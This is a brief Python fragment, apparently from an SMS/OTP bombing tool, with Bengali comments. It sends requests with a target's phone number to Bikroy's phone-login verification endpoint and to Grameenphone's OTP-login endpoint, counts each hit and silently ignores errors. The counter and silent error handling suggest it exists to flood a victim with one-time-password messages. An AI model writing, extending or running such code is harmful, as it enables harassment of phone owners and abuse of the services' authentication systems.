def fast_apis(phone, full):
    try:
        # URL-এ ফোন নম্বর বসানোর ফরম্যাটটি ঠিক করা হয়েছে
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
        requests.get(url, timeout=10)
        update_counter()
    except:
        pass

    try:
        # গ্রামীণফোন API-এর উদাহরণ (আপনার আগের কোড অনুযায়ী)
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0", timeout=10)
        update_counter()
    except:
        pass
